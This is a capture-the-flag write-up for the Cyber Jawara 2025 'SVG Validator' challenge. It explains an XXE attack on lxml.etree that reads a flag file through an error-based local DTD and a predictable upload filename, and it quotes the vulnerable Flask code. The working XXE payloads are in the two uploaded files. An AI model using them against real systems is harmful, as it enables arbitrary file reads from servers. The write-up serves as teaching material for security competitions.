---
id: 17948583-e65d-8037-bf0f-d573b2499823
title: >-
  Read the file with lxml.etree that Vulnerable to XXE, include the local DTD,
  and generate an error to read the Flag: Cyber Jawara National 2025 Quals SVG
  Validator
created_time: 2025-01-12T10:59:00.000Z
last_edited_time: 2025-05-22T09:16:00.000Z
cover_image: ./imgs/mita-miside-oshinokodance-oshinokodance_bVLkwBdw.gif
icon_emoji: 🫡
categories:
  - XXE
verification:
  state: unverified
  verified_by: null
  date: null
page: >-
  Read the file with lxml.etree that Vulnerable to XXE, include the local DTD,
  and generate an error to read the Flag: Cyber Jawara National 2025 Quals SVG
  Validator
owner:
  - object: user
    id: ee7aeeeb-cd0d-4cbb-9e7e-109320ff16fa
    name: Dimas
    avatar_url: >-
      https://s3-us-west-2.amazonaws.com/public.notion-static.com/fab4bcf0-36ea-4bd6-8847-f18b157387da/92920739.png
    type: person
    person:
      email: dimasmaulana0305@gmail.com
_thumbnail: ./imgs/mita-miside-oshinokodance-oshinokodance_bVLkwBdw.gif

---

# Description

A simple SVG validator.

[image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/8d6a70b2-6c3c-410a-9ddb-5303e731a08d/svg-validator.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256\&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD\&X-Amz-Credential=ASIAZI2LB466RAUSF7CL%2F20250523%2Fus-west-2%2Fs3%2Faws4_request\&X-Amz-Date=20250523T100002Z\&X-Amz-Expires=3600\&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDIaCXVzLXdlc3QtMiJIMEYCIQDHEzMvEkztyepX6HRtqwEcmDTeWNrARgni0dW3M6UWqQIhAMD%2BtIqVbnwehiNLoHHk2HgC0jKlhzymzavTmWX%2Fklk1KogECOv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1IgyrzqIyEs7%2Bc1J8Vd0q3APN%2BIdlEusH%2FGadnory69BoOdcHF6RTRM%2FLy2ku95Tn%2BGz%2F85XBcGgvAQoOLNZ2O1%2BlM%2F8MDhjcX6CEOihVIA6FOn47ZNTeFe8zAccZNLdH1x3q7uSxMb7hyS4aOjlgBjXE%2BWyEGU7nKpu0RCDRLo%2FoorDoWMp4V4EnVhcdj2FwCfX7hK20gkURHyVx8C%2F4nSRAMftsoFsehEpqi%2FTsc11DANId6XyxO%2BYu6aeST7oGVKBdjwo1xtanblgwQ%2FyeAcggdYi10cAGS2n1S%2FUkkXcBNTIBg4TSLID4E6P%2BneIxX12a7xd6EQ96F06GZRoSkAWrgE2Lt4%2FybH8B1DRJvFF30rV2B8kSNZZQW5aDOjg4MVS12iaZKzkBe%2F9TEn%2F%2FOPuezmcuCdvRaj91AiCefJ2YS4lk5xNnIyE0duUPgA5KPiA%2B2vkI3GlKzcoTHDOgkMknIYIgrmpV%2Fl3s7rU6LHxA3U1H%2Bf0bpl5IkgnW2AhuNmyUk8zf1te04hd4YP4JV4TCRiYX3n%2BIsWDJD1A7HNxNBbfDnAzn75VlIvhqon0SblR3y06oBaZXBbrCRETnE51kKv6g6y0lqHlmSyQisDg%2F54FOOdTnS3rlLMChLVSTtm2jqWzaQvCtAwB49DDni8HBBjqkAX%2BnpYgWnplS%2F%2B98vY0qGzc9yF7dOaQvAB1dFBaxyGj7ZMAemh9c4dZYLnFwiiE6m4gfXyA4pOhiTt%2FUX2BK6Ci0xUshBGfXfQyewtPD7L0wyEhmk1PvJZfoCZcG67%2FiP5Ixtil7tNFXchkfQxPOcf2wtdWu%2BxzHLGl7dixK5f77ZRVvknM%2Fhreim8DGX5y7cBzKumKe2JIw22FjD7eRmoXh0%2Bmg\&X-Amz-Signature=735386a5f9d06097f4d133eba82664afb9dee8952968cf65641abf845c53539d\&X-Amz-SignedHeaders=host\&x-id=GetObject)

# Exploit

In order to gain Arbitrary File Read, we will exploit the XXE vulnerability in the `lxml.etree`. We must introduce an error in the XML since we cannot read the flag information directly because we do not receive the rendered XML's direct output.

For this task, we have to save our local file on the server, but we can't because it will be deleted after validation. However, we can store and get around the `os.remove` due of a logical error:

```python
        valid = is_valid_svg(file_path)
        os.remove(file_path)

        return jsonify({'valid': valid})
    except Exception as e:
        return jsonify({'error': str(e)}), 500
```

Therefore, by making the `is_valid_svg` function throw an error, we can avoid the `os.remove` step and ensure that the file stored on the server will remain intact even if our `is_valid_svg` method gives an error.

```python
def is_valid_svg(file_path):
    tree = etree.parse(file_path)
    root = tree.getroot()
    return root.tag.endswith('svg')

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return jsonify({'error': 'No file part'}), 400

    file = request.files['file']

    if file.filename == '':
        return jsonify({'error': 'No selected file'}), 400

    if not allowed_file(file.filename):
        return jsonify({'error': 'Invalid file extension'}), 400

    file_path = ''

    try:
        extension = file.filename.rsplit('.', 1)[1].lower()

        filename = hashlib.sha256(
            (file.filename + str(secrets.token_hex)[:16]).encode('utf-8')
        ).hexdigest() + '.' + extension
        file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        file.save(file_path)

        valid = is_valid_svg(file_path)
        os.remove(file_path)

        return jsonify({'valid': valid})
    except Exception as e:
        return jsonify({'error': str(e)}), 500
```

We now need to keep one XML file on the server so that we can add it later to cause an error that will leak the flag. This is the first file we upload:

testing.svg

```python
<!ENTITY % content SYSTEM "file://app/flag.txt">
	<!ENTITY % test '<!ENTITY &#x25; file SYSTEM "file:///tmp/%content;">'>
 	%test;
```

due to the etree.Parse will automatically avoid the os.remove function and throw an error since it does not recognize this as valid XML. The second file is as follows:

file.svg

```python
<!DOCTYPE root [
	<!ENTITY % dtd SYSTEM "file:///tmp/051880fbfbd0b3f38ec3244610784c3a9c258f755039bb7cf1311fd1fc843f2d.svg">
 	%dtd;
]>
<svg></svg>
```

The file in tmp is a file that we upload before, the hash isn’t random and same each iteration because their filename isn’t use secret.token\_hex function properly:

```python
        filename = hashlib.sha256(
            (file.filename + str(secrets.token_hex)[:16]).encode('utf-8')
        ).hexdigest() + '.' + extension
```

So after we uploaded that two file we will get the flag:

![](./imgs/image_UQYv5eO4.png)
